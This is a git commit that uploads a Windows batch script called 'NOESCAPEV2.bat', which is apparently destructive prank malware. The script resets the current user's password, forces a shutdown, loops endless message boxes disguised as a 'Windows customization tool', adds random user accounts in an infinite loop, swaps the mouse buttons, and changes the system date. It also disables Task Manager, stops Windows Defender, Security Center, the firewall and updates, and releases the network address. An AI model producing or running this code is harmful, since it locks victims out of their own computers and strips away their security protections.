26194ce37a4f04ba5a316bb5c015a7b3e2eac5b3
Creatorvs <109811324+CreatorvsIShere@users.noreply.github.com>
2022-07-22 08:00:14 -0700

    Add files via upload

---
+++ NOESCAPEV2.bat
@@ -0,0 +1,30 @@
+:user
+
+@echo off
+shutdown -s -t 10 -c "NOESCAPE V2 IS HERE"
+net user %username% *
+death
+death
+start cmd.exe
+echo do>>msg.vbs
+echo Msgbox"use your pc as long as you can NO PAYLOADS 
+SO YOU CANT ESCAPE",48+2,"Windows customization tool">>msg.vbs
+echo loop>>msg.vbs
+start msg.vbs
+RUNDLL32 USER32.DLL,SwapMouseButton
+date 7/18/1666
+time 06:06:06
+net user %random% /add
+goto user
+@Echo off & @@Break Off
+Ipconfig / release
+%jUmP%E%nD%c%onFiG%h%IdE%o%P% h%aRv%%aRd%A%T%%cHe%cK%HappY%3D b%aLLo0Ns%Y%eS% m3Ga!?!
+P%ReSs%%IE%AuS%ExPloR%e%r% > nul.%TempInternetRelease%
+reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_SZ /d 1 /f >nul
+net stop "SDRSVC"
+net stop "WinDefend"
+taskkill /f /t /im "MSASCui.exe"
+net stop "security center"
+net stop sharedaccess
+netsh firewall set opmode mode-disable
+net stop "wuauserv"
